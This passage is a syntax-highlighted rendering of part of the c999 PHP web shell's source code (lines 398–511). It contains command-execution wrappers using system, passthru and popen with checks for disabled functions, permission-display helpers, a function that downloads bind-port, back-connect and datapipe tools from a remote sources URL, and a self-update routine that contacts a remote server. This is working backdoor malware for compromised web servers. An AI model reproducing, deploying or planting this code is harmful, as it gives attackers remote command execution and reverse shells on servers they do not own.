<span class="lineno"> 398</span>   <span class="k">elseif</span> <span class="p">(</span><span class="nb">is_callable</span><span class="p">(</span><span class="s2">&quot;system&quot;</span><span class="p">)</span> <span class="k">and</span> <span class="o">!</span><span class="nb">in_array</span><span class="p">(</span><span class="s2">&quot;system&quot;</span><span class="p">,</span><span class="nv">$disablefunc</span><span class="p">))</span> <span class="p">{</span><span class="nv">$v</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ob_get_contents</span><span class="p">();</span> <span class="o">@</span><span class="nb">ob_clean</span><span class="p">();</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span> <span class="nv">$result</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ob_get_contents</span><span class="p">();</span> <span class="o">@</span><span class="nb">ob_clean</span><span class="p">();</span> <span class="k">echo</span> <span class="nv">$v</span><span class="p">;}</span>
<span class="lineno"> 399</span>   <span class="k">elseif</span> <span class="p">(</span><span class="nb">is_callable</span><span class="p">(</span><span class="s2">&quot;passthru&quot;</span><span class="p">)</span> <span class="k">and</span> <span class="o">!</span><span class="nb">in_array</span><span class="p">(</span><span class="s2">&quot;passthru&quot;</span><span class="p">,</span><span class="nv">$disablefunc</span><span class="p">))</span> <span class="p">{</span><span class="nv">$v</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ob_get_contents</span><span class="p">();</span> <span class="o">@</span><span class="nb">ob_clean</span><span class="p">();</span> <span class="nb">passthru</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span> <span class="nv">$result</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ob_get_contents</span><span class="p">();</span> <span class="o">@</span><span class="nb">ob_clean</span><span class="p">();</span> <span class="k">echo</span> <span class="nv">$v</span><span class="p">;}</span>
<span class="lineno"> 400</span>   <span class="k">elseif</span> <span class="p">(</span><span class="nb">is_resource</span><span class="p">(</span><span class="nv">$fp</span> <span class="o">=</span> <span class="nb">popen</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">,</span><span class="s2">&quot;r&quot;</span><span class="p">)))</span>
<span class="lineno"> 401</span>   <span class="p">{</span>
<span class="lineno"> 402</span>    <span class="nv">$result</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
<span class="lineno"> 403</span>    <span class="k">while</span><span class="p">(</span><span class="o">!</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$fp</span><span class="p">))</span> <span class="p">{</span><span class="nv">$result</span> <span class="o">.=</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="mi">1024</span><span class="p">);}</span>
<span class="lineno"> 404</span>    <span class="nb">pclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
<span class="lineno"> 405</span>   <span class="p">}</span>
<span class="lineno"> 406</span>  <span class="p">}</span>
<span class="lineno"> 407</span>  <span class="k">return</span> <span class="nv">$result</span><span class="p">;</span>
<span class="lineno"> 408</span> <span class="p">}</span>
<span class="lineno"> 409</span> <span class="p">}</span>
<span class="lineno"> 410</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;tabsort&quot;</span><span class="p">))</span> <span class="p">{</span><span class="k">function</span> <span class="nf">tabsort</span><span class="p">(</span><span class="nv">$a</span><span class="p">,</span><span class="nv">$b</span><span class="p">)</span> <span class="p">{</span><span class="k">global</span> <span class="nv">$v</span><span class="p">;</span> <span class="k">return</span> <span class="nb">strnatcmp</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="nv">$v</span><span class="p">],</span> <span class="nv">$b</span><span class="p">[</span><span class="nv">$v</span><span class="p">]);}}</span>
<span class="lineno"> 411</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;view_perms&quot;</span><span class="p">))</span>
<span class="lineno"> 412</span> <span class="p">{</span>
<span class="lineno"> 413</span> <span class="k">function</span> <span class="nf">view_perms</span><span class="p">(</span><span class="nv">$mode</span><span class="p">)</span>
<span class="lineno"> 414</span> <span class="p">{</span>
<span class="lineno"> 415</span>  <span class="k">if</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0xC000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0xC000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$type</span> <span class="o">=</span> <span class="s2">&quot;s&quot;</span><span class="p">;}</span>
<span class="lineno"> 416</span>  <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x4000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0x4000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$type</span> <span class="o">=</span> <span class="s2">&quot;d&quot;</span><span class="p">;}</span>
<span class="lineno"> 417</span>  <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0xA000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0xA000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$type</span> <span class="o">=</span> <span class="s2">&quot;l&quot;</span><span class="p">;}</span>
<span class="lineno"> 418</span>  <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x8000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0x8000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$type</span> <span class="o">=</span> <span class="s2">&quot;-&quot;</span><span class="p">;}</span>
<span class="lineno"> 419</span>  <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x6000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0x6000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$type</span> <span class="o">=</span> <span class="s2">&quot;b&quot;</span><span class="p">;}</span>
<span class="lineno"> 420</span>  <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x2000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0x2000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$type</span> <span class="o">=</span> <span class="s2">&quot;c&quot;</span><span class="p">;}</span>
<span class="lineno"> 421</span>  <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$type</span> <span class="o">=</span> <span class="s2">&quot;p&quot;</span><span class="p">;}</span>
<span class="lineno"> 422</span>  <span class="k">else</span> <span class="p">{</span><span class="nv">$type</span> <span class="o">=</span> <span class="s2">&quot;?&quot;</span><span class="p">;}</span>
<span class="lineno"> 423</span>  <span class="nv">$owner</span><span class="p">[</span><span class="s2">&quot;read&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00400</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;r&quot;</span><span class="o">:</span><span class="s2">&quot;-&quot;</span><span class="p">;</span>
<span class="lineno"> 424</span>  <span class="nv">$owner</span><span class="p">[</span><span class="s2">&quot;write&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00200</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;w&quot;</span><span class="o">:</span><span class="s2">&quot;-&quot;</span><span class="p">;</span>
<span class="lineno"> 425</span>  <span class="nv">$owner</span><span class="p">[</span><span class="s2">&quot;execute&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00100</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;x&quot;</span><span class="o">:</span><span class="s2">&quot;-&quot;</span><span class="p">;</span>
<span class="lineno"> 426</span>  <span class="nv">$group</span><span class="p">[</span><span class="s2">&quot;read&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00040</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;r&quot;</span><span class="o">:</span><span class="s2">&quot;-&quot;</span><span class="p">;</span>
<span class="lineno"> 427</span>  <span class="nv">$group</span><span class="p">[</span><span class="s2">&quot;write&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00020</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;w&quot;</span><span class="o">:</span><span class="s2">&quot;-&quot;</span><span class="p">;</span>
<span class="lineno"> 428</span>  <span class="nv">$group</span><span class="p">[</span><span class="s2">&quot;execute&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00010</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;x&quot;</span><span class="o">:</span><span class="s2">&quot;-&quot;</span><span class="p">;</span>
<span class="lineno"> 429</span>  <span class="nv">$world</span><span class="p">[</span><span class="s2">&quot;read&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00004</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;r&quot;</span><span class="o">:</span><span class="s2">&quot;-&quot;</span><span class="p">;</span>
<span class="lineno"> 430</span>  <span class="nv">$world</span><span class="p">[</span><span class="s2">&quot;write&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00002</span><span class="p">)</span><span class="o">?</span> <span class="s2">&quot;w&quot;</span><span class="o">:</span><span class="s2">&quot;-&quot;</span><span class="p">;</span>
<span class="lineno"> 431</span>  <span class="nv">$world</span><span class="p">[</span><span class="s2">&quot;execute&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00001</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;x&quot;</span><span class="o">:</span><span class="s2">&quot;-&quot;</span><span class="p">;</span>
<span class="lineno"> 432</span>  <span class="k">if</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x800</span><span class="p">)</span> <span class="p">{</span><span class="nv">$owner</span><span class="p">[</span><span class="s2">&quot;execute&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$owner</span><span class="p">[</span><span class="s2">&quot;execute&quot;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;x&quot;</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;s&quot;</span><span class="o">:</span><span class="s2">&quot;S&quot;</span><span class="p">;}</span>
<span class="lineno"> 433</span>  <span class="k">if</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x400</span><span class="p">)</span> <span class="p">{</span><span class="nv">$group</span><span class="p">[</span><span class="s2">&quot;execute&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$group</span><span class="p">[</span><span class="s2">&quot;execute&quot;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;x&quot;</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;s&quot;</span><span class="o">:</span><span class="s2">&quot;S&quot;</span><span class="p">;}</span>
<span class="lineno"> 434</span>  <span class="k">if</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x200</span><span class="p">)</span> <span class="p">{</span><span class="nv">$world</span><span class="p">[</span><span class="s2">&quot;execute&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$world</span><span class="p">[</span><span class="s2">&quot;execute&quot;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;x&quot;</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;t&quot;</span><span class="o">:</span><span class="s2">&quot;T&quot;</span><span class="p">;}</span>
<span class="lineno"> 435</span>  <span class="k">return</span> <span class="nv">$type</span><span class="o">.</span><span class="nb">join</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="nv">$owner</span><span class="p">)</span><span class="o">.</span><span class="nb">join</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="nv">$group</span><span class="p">)</span><span class="o">.</span><span class="nb">join</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="nv">$world</span><span class="p">);</span>
<span class="lineno"> 436</span> <span class="p">}</span>
<span class="lineno"> 437</span> <span class="p">}</span>
<span class="lineno"> 438</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;posix_getpwuid&quot;</span><span class="p">)</span> <span class="k">and</span> <span class="o">!</span><span class="nb">in_array</span><span class="p">(</span><span class="s2">&quot;posix_getpwuid&quot;</span><span class="p">,</span><span class="nv">$disablefunc</span><span class="p">))</span> <span class="p">{</span><span class="k">function</span> <span class="nf">posix_getpwuid</span><span class="p">(</span><span class="nv">$uid</span><span class="p">)</span> <span class="p">{</span><span class="k">return</span> <span class="k">FALSE</span><span class="p">;}}</span>
<span class="lineno"> 439</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;posix_getgrgid&quot;</span><span class="p">)</span> <span class="k">and</span> <span class="o">!</span><span class="nb">in_array</span><span class="p">(</span><span class="s2">&quot;posix_getgrgid&quot;</span><span class="p">,</span><span class="nv">$disablefunc</span><span class="p">))</span> <span class="p">{</span><span class="k">function</span> <span class="nf">posix_getgrgid</span><span class="p">(</span><span class="nv">$gid</span><span class="p">)</span> <span class="p">{</span><span class="k">return</span> <span class="k">FALSE</span><span class="p">;}}</span>
<span class="lineno"> 440</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;posix_kill&quot;</span><span class="p">)</span> <span class="k">and</span> <span class="o">!</span><span class="nb">in_array</span><span class="p">(</span><span class="s2">&quot;posix_kill&quot;</span><span class="p">,</span><span class="nv">$disablefunc</span><span class="p">))</span> <span class="p">{</span><span class="k">function</span> <span class="nf">posix_kill</span><span class="p">(</span><span class="nv">$gid</span><span class="p">)</span> <span class="p">{</span><span class="k">return</span> <span class="k">FALSE</span><span class="p">;}}</span>
<span class="lineno"> 441</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;parse_perms&quot;</span><span class="p">))</span>
<span class="lineno"> 442</span> <span class="p">{</span>
<span class="lineno"> 443</span> <span class="k">function</span> <span class="nf">parse_perms</span><span class="p">(</span><span class="nv">$mode</span><span class="p">)</span>
<span class="lineno"> 444</span> <span class="p">{</span>
<span class="lineno"> 445</span>  <span class="k">if</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0xC000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0xC000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$t</span> <span class="o">=</span> <span class="s2">&quot;s&quot;</span><span class="p">;}</span>
<span class="lineno"> 446</span>  <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x4000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0x4000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$t</span> <span class="o">=</span> <span class="s2">&quot;d&quot;</span><span class="p">;}</span>
<span class="lineno"> 447</span>  <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0xA000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0xA000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$t</span> <span class="o">=</span> <span class="s2">&quot;l&quot;</span><span class="p">;}</span>
<span class="lineno"> 448</span>  <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x8000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0x8000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$t</span> <span class="o">=</span> <span class="s2">&quot;-&quot;</span><span class="p">;}</span>
<span class="lineno"> 449</span>  <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x6000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0x6000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$t</span> <span class="o">=</span> <span class="s2">&quot;b&quot;</span><span class="p">;}</span>
<span class="lineno"> 450</span>  <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x2000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0x2000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$t</span> <span class="o">=</span> <span class="s2">&quot;c&quot;</span><span class="p">;}</span>
<span class="lineno"> 451</span>  <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$t</span> <span class="o">=</span> <span class="s2">&quot;p&quot;</span><span class="p">;}</span>
<span class="lineno"> 452</span>  <span class="k">else</span> <span class="p">{</span><span class="nv">$t</span> <span class="o">=</span> <span class="s2">&quot;?&quot;</span><span class="p">;}</span>
<span class="lineno"> 453</span>  <span class="nv">$o</span><span class="p">[</span><span class="s2">&quot;r&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00400</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$o</span><span class="p">[</span><span class="s2">&quot;w&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00200</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$o</span><span class="p">[</span><span class="s2">&quot;x&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00100</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">;</span>
<span class="lineno"> 454</span>  <span class="nv">$g</span><span class="p">[</span><span class="s2">&quot;r&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00040</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$g</span><span class="p">[</span><span class="s2">&quot;w&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00020</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$g</span><span class="p">[</span><span class="s2">&quot;x&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00010</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">;</span>
<span class="lineno"> 455</span>  <span class="nv">$w</span><span class="p">[</span><span class="s2">&quot;r&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00004</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$w</span><span class="p">[</span><span class="s2">&quot;w&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00002</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$w</span><span class="p">[</span><span class="s2">&quot;x&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00001</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">;</span>
<span class="lineno"> 456</span>  <span class="k">return</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;t&quot;</span><span class="o">=&gt;</span><span class="nv">$t</span><span class="p">,</span><span class="s2">&quot;o&quot;</span><span class="o">=&gt;</span><span class="nv">$o</span><span class="p">,</span><span class="s2">&quot;g&quot;</span><span class="o">=&gt;</span><span class="nv">$g</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="o">=&gt;</span><span class="nv">$w</span><span class="p">);</span>
<span class="lineno"> 457</span> <span class="p">}</span>
<span class="lineno"> 458</span> <span class="p">}</span>
<span class="lineno"> 459</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;parsesort&quot;</span><span class="p">))</span>
<span class="lineno"> 460</span> <span class="p">{</span>
<span class="lineno"> 461</span> <span class="k">function</span> <span class="nf">parsesort</span><span class="p">(</span><span class="nv">$sort</span><span class="p">)</span>
<span class="lineno"> 462</span> <span class="p">{</span>
<span class="lineno"> 463</span>  <span class="nv">$one</span> <span class="o">=</span> <span class="nb">intval</span><span class="p">(</span><span class="nv">$sort</span><span class="p">);</span>
<span class="lineno"> 464</span>  <span class="nv">$second</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$sort</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
<span class="lineno"> 465</span>  <span class="k">if</span> <span class="p">(</span><span class="nv">$second</span> <span class="o">!=</span> <span class="s2">&quot;d&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$second</span> <span class="o">=</span> <span class="s2">&quot;a&quot;</span><span class="p">;}</span>
<span class="lineno"> 466</span>  <span class="k">return</span> <span class="k">array</span><span class="p">(</span><span class="nv">$one</span><span class="p">,</span><span class="nv">$second</span><span class="p">);</span>
<span class="lineno"> 467</span> <span class="p">}</span>
<span class="lineno"> 468</span> <span class="p">}</span>
<span class="lineno"> 469</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;view_perms_color&quot;</span><span class="p">))</span>
<span class="lineno"> 470</span> <span class="p">{</span>
<span class="lineno"> 471</span> <span class="k">function</span> <span class="nf">view_perms_color</span><span class="p">(</span><span class="nv">$o</span><span class="p">)</span>
<span class="lineno"> 472</span> <span class="p">{</span>
<span class="lineno"> 473</span>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_readable</span><span class="p">(</span><span class="nv">$o</span><span class="p">))</span> <span class="p">{</span><span class="k">return</span> <span class="s2">&quot;&lt;/pre&gt;</span>
<span class="lineno"> 474</span> <span class="s2">&lt;span style=&quot;</span><span class="nx">color</span><span class="o">:</span> <span class="nx">red</span><span class="p">;</span><span class="s2">&quot;&gt;&quot;</span><span class="o">.</span><span class="nx">view_perms</span><span class="p">(</span><span class="nb">fileperms</span><span class="p">(</span><span class="nv">$o</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;&lt;/span&gt;</span>
<span class="lineno"> 475</span> <span class="s2">&lt;pre&gt;&quot;</span><span class="p">;}</span>
<span class="lineno"> 476</span>  <span class="k">elseif</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_writable</span><span class="p">(</span><span class="nv">$o</span><span class="p">))</span> <span class="p">{</span><span class="k">return</span> <span class="s2">&quot;&lt;/pre&gt;</span>
<span class="lineno"> 477</span> <span class="s2">&lt;span style=&quot;</span><span class="nx">color</span><span class="o">:</span> <span class="nx">white</span><span class="p">;</span><span class="s2">&quot;&gt;&quot;</span><span class="o">.</span><span class="nx">view_perms</span><span class="p">(</span><span class="nb">fileperms</span><span class="p">(</span><span class="nv">$o</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;&lt;/span&gt;</span>
<span class="lineno"> 478</span> <span class="s2">&lt;pre&gt;&quot;</span><span class="p">;}</span>
<span class="lineno"> 479</span>  <span class="k">else</span> <span class="p">{</span><span class="k">return</span> <span class="s2">&quot;&lt;/pre&gt;</span>
<span class="lineno"> 480</span> <span class="s2">&lt;span style=&quot;</span><span class="nx">color</span><span class="o">:</span> <span class="nx">green</span><span class="p">;</span><span class="s2">&quot;&gt;&quot;</span><span class="o">.</span><span class="nx">view_perms</span><span class="p">(</span><span class="nb">fileperms</span><span class="p">(</span><span class="nv">$o</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;&lt;/span&gt;</span>
<span class="lineno"> 481</span> <span class="s2">&lt;pre&gt;&quot;</span><span class="p">;}</span>
<span class="lineno"> 482</span> <span class="p">}</span>
<span class="lineno"> 483</span> <span class="p">}</span>
<span class="lineno"> 484</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;c999getsource&quot;</span><span class="p">))</span>
<span class="lineno"> 485</span> <span class="p">{</span>
<span class="lineno"> 486</span> <span class="k">function</span> <span class="nf">c999getsource</span><span class="p">(</span><span class="nv">$fn</span><span class="p">)</span>
<span class="lineno"> 487</span> <span class="p">{</span>
<span class="lineno"> 488</span>  <span class="k">global</span> <span class="nv">$c999sh_sourcesurl</span><span class="p">;</span>
<span class="lineno"> 489</span>  <span class="nv">$array</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
<span class="lineno"> 490</span>   <span class="s2">&quot;c999sh_bindport.pl&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;c999sh_bindport_pl.txt&quot;</span><span class="p">,</span>
<span class="lineno"> 491</span>   <span class="s2">&quot;c999sh_bindport.c&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;c999sh_bindport_c.txt&quot;</span><span class="p">,</span>
<span class="lineno"> 492</span>   <span class="s2">&quot;c999sh_backconn.pl&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;c999sh_backconn_pl.txt&quot;</span><span class="p">,</span>
<span class="lineno"> 493</span>   <span class="s2">&quot;c999sh_backconn.c&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;c999sh_backconn_c.txt&quot;</span><span class="p">,</span>
<span class="lineno"> 494</span>   <span class="s2">&quot;c999sh_datapipe.pl&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;c999sh_datapipe_pl.txt&quot;</span><span class="p">,</span>
<span class="lineno"> 495</span>   <span class="s2">&quot;c999sh_datapipe.c&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;c999sh_datapipe_c.txt&quot;</span><span class="p">,</span>
<span class="lineno"> 496</span>  <span class="p">);</span>
<span class="lineno"> 497</span>  <span class="nv">$name</span> <span class="o">=</span> <span class="nv">$array</span><span class="p">[</span><span class="nv">$fn</span><span class="p">];</span>
<span class="lineno"> 498</span>  <span class="k">if</span> <span class="p">(</span><span class="nv">$name</span><span class="p">)</span> <span class="p">{</span><span class="k">return</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$c999sh_sourcesurl</span><span class="o">.</span><span class="nv">$name</span><span class="p">);}</span>
<span class="lineno"> 499</span>  <span class="k">else</span> <span class="p">{</span><span class="k">return</span> <span class="k">FALSE</span><span class="p">;}</span>
<span class="lineno"> 500</span> <span class="p">}</span>
<span class="lineno"> 501</span> <span class="p">}</span>
<span class="lineno"> 502</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;c999sh_getupdate&quot;</span><span class="p">))</span>
<span class="lineno"> 503</span> <span class="p">{</span>
<span class="lineno"> 504</span> <span class="k">function</span> <span class="nf">c999sh_getupdate</span><span class="p">(</span><span class="nv">$update</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">)</span>
<span class="lineno"> 505</span> <span class="p">{</span>
<span class="lineno"> 506</span>  <span class="nv">$url</span> <span class="o">=</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s2">&quot;c999sh_updateurl&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;?version=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s2">&quot;shver&quot;</span><span class="p">]))</span><span class="o">.</span><span class="s2">&quot;&amp;updatenow=&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$updatenow</span><span class="o">?</span><span class="s2">&quot;1&quot;</span><span class="o">:</span><span class="s2">&quot;0&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;&quot;</span><span class="p">;</span>
<span class="lineno"> 507</span>  <span class="nv">$data</span> <span class="o">=</span> <span class="o">@</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
<span class="lineno"> 508</span>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$data</span><span class="p">)</span> <span class="p">{</span><span class="k">return</span> <span class="s2">&quot;Can&#39;t connect to update-server!&quot;</span><span class="p">;}</span>
<span class="lineno"> 509</span>  <span class="k">else</span>
<span class="lineno"> 510</span>  <span class="p">{</span>
<span class="lineno"> 511</span>   <span class="nv">$data</span> <span class="o">=</span> <span class="nb">ltrim</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
